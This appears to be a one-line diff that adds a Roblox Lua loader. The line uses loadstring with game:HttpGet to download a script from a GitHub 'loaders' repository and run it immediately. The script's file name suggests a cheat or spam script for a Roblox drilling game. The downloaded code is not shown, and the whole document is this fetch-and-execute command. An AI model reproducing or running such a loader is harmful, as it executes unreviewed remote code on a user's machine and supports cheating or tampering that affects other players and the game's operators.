@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/drill-to-earth-s-core-spam6-qxlzpnugl09l1n.lua"))()
